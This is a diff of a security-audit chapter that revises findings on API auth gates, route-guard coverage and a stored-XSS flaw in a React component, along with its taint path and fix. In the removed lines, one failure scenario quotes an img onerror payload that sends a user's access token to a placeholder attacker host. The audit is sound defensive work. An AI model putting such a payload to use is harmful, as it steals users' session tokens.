@@ -1,8 +1,9 @@
 # Chapter 04 — Security
 
-**Verdict: the perimeter is well built and empirically holds. The gaps are inside it — one
-reachable XSS sink fed by model output, uneven upload hardening, incomplete SSRF coverage,
-and a suppressed unpatched RCE whose stated precondition was never checked.**
+**Verdict: the perimeter is well built and empirically holds — with two global `/api` gates,
+one of which enforces unconditionally. The gaps are inside it: one reachable stored-XSS sink,
+uneven upload hardening, incomplete SSRF coverage, and a suppressed unpatched RCE whose stated
+precondition was never checked.**
 
 ---
 
@@ -17,10 +18,25 @@ Nine data endpoints probed unauthenticated against a running server, in
 | `/healthz`, `/readyz`, `/api/health`, `/api/time` | 200 (intended) |
 
 `server/middleware/authBoundary.ts` mounts a default-deny boundary on `/api` at
-`startup/middleware.ts:114`, **before any route registers**, with a 19-entry public
-allowlist. The static sweep found only **589 of 4,077** endpoints (14.4%) carry a
-route-level guard — but that measures **defence in depth, not exposure**, and this audit
-reports it that way. The boundary held on everything tested.
+`startup/middleware.ts:114`, **before any route registers**, with a 19-entry public allowlist.
+
+**Corrected figure (Chapter 03, C10).** An initial sweep reported 589 of 4,077 endpoints
+(14.4%) carrying a route-level guard. That counted only middleware named on the declaration
+line. Re-measured including module-level `router.use()` and mount-level
+`app.use(path, guard, router)`: **2,028 of 4,077 (49.7%)** — and that is a floor.
+
+**There are two global `/api` gates, not one.** Besides `authBoundary`, an older gate at
+`server/bootstrap/register-platform-routes.ts:232-264` applies `authMiddleware` to every
+`/api` path outside a 19-entry open list **with no mode switch — it enforces in every
+`NODE_ENV`**. `registerPlatformRoutes` runs first, so every later route family sits behind
+both. This is why the dev probes returned 401 while `authBoundary` was in `warn` mode: warn
+mode does not reject — it runs the authenticator against a stub `res` that swallows the 401
+(`authBoundary.ts:174-193`).
+
+**The residual risk is narrow:** routes mounted *before* line 232 in
+`register-platform-routes.ts` — `/api/users`, `/api/user`, `/api/admin`, health — sit ahead of
+the unconditional gate, so outside production only their own hand-rolled checks apply.
+**P2 across four prefixes, not P1 across the API.**
 
 Other controls verified present and sensibly built:
 
@@ -60,42 +76,43 @@ actionable answer:
 | **Properly sanitised** | `Message.tsx` ×3, `DocumentStudioPane.tsx` | ✅ All route through `renderSafeMarkdown.ts` — a single `marked → DOMPurify.sanitize` choke point (`:22,88`) — or `sanitizeChatHtml`. Good design. |
 | **Escaped by construction** | `Biostatistics.tsx:464`, `ReportEngine.tsx`, `CmcModule.tsx` | ✅ Each defines a local `mdToHtml()` whose `esc()` escapes `&`, `<`, `>` **before** applying formatting (`Biostatistics.tsx:465`). Safe — but it is **three copies of the same hand-rolled renderer** with no shared test, so a future edit to one is a silent regression. |
 | **Unreachable** | `EditorTranslate.tsx` ×2, `EditorStudio.tsx`, `AnaVerbs.tsx` | ⚪ None appears in `v2/surfaceViews.ts`; they are part of the dead `Editor*` family. Not exploitable today. Severity downgraded accordingly. |
-| **Reachable and unsanitised** | **`BatchDraft.tsx:490`** | 🔴 **P1** |
+| **Reachable and unsanitised** | **`BatchDraft.tsx:490`** | 🔴 **P1 — stored XSS** |
 | Library pattern | `components/ui/chart.tsx:76` | ⚪ shadcn style-injection, low risk |
 
 ### The one that matters — `BatchDraft.tsx`
 
-`BatchDraft` **is** registered (`v2/surfaceViews.ts:25`), so it is reachable. Its card body
-renders raw:
+`BatchDraft` **is** registered (`v2/surfaceViews.ts:131`), deep-linkable at
+`/concept2cure/batch-draft`, and `ENABLE_UI_V2` defaults true. Its card body renders raw:
 
 ```tsx
 <div className="bd-card-body" dangerouslySetInnerHTML={{ __html: c.html || '…' }} />
 ```
 
-and `c.html` is assigned directly from model output, twice:
+**Corrected taint path (Chapter 03, C7).** This audit first reported the source as streamed
+model output at `:226` / `:231`. **That was wrong** — those lines are unreachable, gated at
+`:216` on `window.C2C_AUTHORING`, which is assigned nowhere in the repository and is pinned as
+unset by a *passing* CI test (`tests/ci/no-ghost-globals.contract.test.ts:143-150`). `run()`
+always takes the offline branch.
 
-```tsx
-onSectionText:     (key, full)    => setCards(c => ({…, html: full }))          // :226  streaming
-onSectionComplete: (key, content) => { const html = sample ? bdSample(…) : (content || ''); … }  // :231
-```
+The real path is **stored XSS**, and it is worse in one respect. The only value reaching
+`c.html` is `bdSample()` output (`:101-110`), which interpolates the server-supplied `title`
+and `preview` into HTML **with no escaping**. Those originate from `coauthor_documents` via
+`server/routes/batch-draft-routes.ts:170-177`, where `derivePreview` (`:104-111`) strips tags
+and then **HTML-entity-decodes** `&lt;`, `&gt;`, `&quot;` and `&#39;` — **re-animating markup
+the editor had correctly escaped on the way in.**
 
-**Failure scenario.** A user uploads a source document (or pastes content) containing
-`<img src=x onerror="fetch('https://attacker/'+localStorage.trialsage_access_token)">`. The
-drafting model echoes that fragment into a generated section — a normal thing for a model
-asked to reproduce source content. It is written to `c.html` unmodified and rendered as
-live HTML. Because drafts in this product are shared across a project team, the payload
-executes in **every reviewer's** browser, with access to `localStorage`, where
-`AGENTS.md` documents the auth tokens are kept (`trialsage_access_token`,
-`trialsage_refresh_token`).
+**Failure scenario.** A user saves a document whose title or body contains
+`&lt;img src=x onerror=…&gt;` — already escaped and inert in storage. `derivePreview` decodes
+it back into live markup, `bdSample()` interpolates it unescaped, and `:490` renders it. It
+executes in the browser of every user who opens Batch Draft for that project, against the
+`localStorage` where `AGENTS.md` documents the auth tokens live.
 
-**Fix:** route it through the existing `renderSafeMarkdown` / `sanitizeChatHtml` choke
-point. The correct implementation already exists in this codebase.
-**Effort:** hours. **Acceptance test:** a drafted section containing an `onerror` payload
-renders inert.
+**Fix is two-part**, and the second half would have been missed under the original finding:
+sanitize at `:490` through the existing `renderSafeMarkdown` choke point, **and** stop the
+entity-decoding in `derivePreview`. **Effort: hours.**
 
-**Why this was never flagged:** `eslint.config.js:34` excludes **all of `client/src/**`** —
-871 files, 191,327 lines — so `react/no-danger` could not fire. That exclusion is the root
-cause, and is why Chapter 08 ranks re-enabling it above most other quality work.
+**Why it was never flagged:** `eslint.config.js:34` excludes all of `client/src/**` — 871
+files, 191,327 lines — so `react/no-danger` could not fire.
 
 ## 4.3 File upload — hardening exists and is barely adopted
 
